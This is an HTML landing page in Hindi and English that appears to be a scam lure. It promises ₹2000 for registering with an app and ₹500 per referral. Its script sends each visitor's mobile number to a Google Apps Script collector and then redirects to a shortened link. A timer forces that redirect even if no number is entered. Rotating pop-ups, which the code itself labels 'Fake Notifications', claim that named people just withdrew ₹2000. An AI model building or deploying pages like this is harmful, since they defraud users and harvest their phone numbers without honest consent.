<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Rewards - Claim ₹2000</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body {
            background: #0f0c29;
            background: linear-gradient(to bottom, #302b63, #24243e, #0f0c29);
            min-height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; padding: 15px;
        }
        .main-card {
            background: #ffffff; width: 100%; max-width: 420px; border-radius: 30px;
            padding: 25px; text-align: center; position: relative; box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            border-top: 10px solid #25D366;
        }
        .guarantee-tag {
            background: #ff0000; color: #fff; font-size: 12px; font-weight: bold;
            padding: 4px 15px; border-radius: 50px; display: inline-block; margin-bottom: 10px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-5px);} 60% {transform: translateY(-3px);} }
        
        .main-title { font-size: 24px; font-weight: 900; color: #1a237e; margin: 5px 0; line-height: 1.3; }
        .green-text { color: #2e7d32; }
        
        .offer-box {
            background: #f1f8e9; border: 2px dashed #25D366; border-radius: 20px;
            padding: 15px; margin: 20px 0; text-align: left;
        }
        .offer-box ul { list-style: none; padding: 0; margin: 0; }
        .offer-box li { font-size: 14px; margin-bottom: 8px; font-weight: 600; color: #333; }
        .offer-box li span { color: #25D366; margin-right: 8px; font-weight: bold; }

        input[type="tel"] {
            width: 100%; padding: 18px; border-radius: 15px; border: 2px solid #ddd;
            font-size: 18px; text-align: center; font-weight: bold; margin-bottom: 15px; outline: none;
            transition: 0.3s;
        }
        input[type="tel"]:focus { border-color: #25D366; box-shadow: 0 0 10px rgba(37,211,102,0.2); }

        .cta-button {
            width: 100%; padding: 18px; background: #25D366; color: white;
            border: none; border-radius: 15px; font-size: 20px; font-weight: 900;
            cursor: pointer; box-shadow: 0 10px 20px rgba(37,211,102,0.3);
            transition: 0.3s; display: block;
        }
        .cta-button:active { transform: scale(0.96); }

        .status-bar { font-size: 11px; color: #999; margin-top: 12px; border-top: 1px solid #eee; padding-top: 10px; }

        #notification {
            position: fixed; top: 15px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.85); color: white; padding: 10px 25px;
            border-radius: 50px; font-size: 13px; z-index: 100; display: none;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>

<div id="notification">Rahul just earned ₹2000!</div>

<div class="main-card">
    <div class="guarantee-tag">💯% गारंटी - Trusted Offer</div>
    <div class="main-title">New App Register करते ही <br><span class="green-text">₹2000 कमाएं</span></div>
    
    <div class="offer-box">
        <ul>
            <li><span>✔</span> रजिस्टर + लॉगिन करें</li>
            <li><span>✔</span> Per Refer <b>₹500</b></li>
            <li><span>✔</span> Minimum withdrawal <b>₹1</b></li>
            <li><span>✔</span> Instant Withdraw (Bank Account)</li>
        </ul>
    </div>

    <input type="tel" id="userPhone" placeholder="Mobile Number डालें" maxlength="10" oninput="checkInput()">
    
    <button id="claimBtn" class="cta-button" onclick="handleSubmit()">रजिस्टर करें 👉</button>

    <div id="countdown" class="status-bar">Connecting to Server in 30s...</div>
</div>

<script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby9qR9N6bh7Ym7m2x4sXn9XLyuvjkeoqr0xlV9ozfU4itPbk8-tw-skpFp0ydfvCKlH/exec";
    const FINAL_LINK = "https://is.gd/Earn_2000_Daily";
    let timer = 30; // 30 seconds set kar diya hai
    let isTyping = false;

    function checkInput() {
        let input = document.getElementById('userPhone').value;
        if(input.length > 0) isTyping = true;
        
        let btn = document.getElementById('claimBtn');
        if(input.length === 10) {
            btn.style.background = "#1b5e20";
        }
    }

    function handleSubmit() {
        let phone = document.getElementById('userPhone').value;
        if(phone.length === 10) {
            document.getElementById('claimBtn').innerText = "Verifying...";
            fetch(SCRIPT_URL + "?mobile=" + phone, { method: 'GET', mode: 'no-cors' })
            .finally(() => { 
                window.location.href = FINAL_LINK; 
            });
            setTimeout(() => { window.location.href = FINAL_LINK; }, 2000);
        } else {
            alert("कृपया 10 अंकों का मोबाइल नंबर डालें");
        }
    }

    // Auto Redirect Timer Logic
    setInterval(() => {
        if(!isTyping && timer > 0) {
            timer--;
            document.getElementById('countdown').innerText = "Automatic redirect in " + timer + "s...";
            if(timer === 0) window.location.href = FINAL_LINK;
        }
    }, 1000);

    // Fake Notifications
    const people = ["Aman", "Sumit", "Pooja", "Vikram", "Rohan", "Sneha"];
    setInterval(() => {
        let person = people[Math.floor(Math.random() * people.length)];
        let note = document.getElementById('notification');
        note.innerText = "✅ " + person + " ne abhi ₹2000 nikale!";
        note.style.display = "block";
        setTimeout(() => { note.style.display = "none"; }, 3000);
    }, 7000);
</script>

</body>
</html>
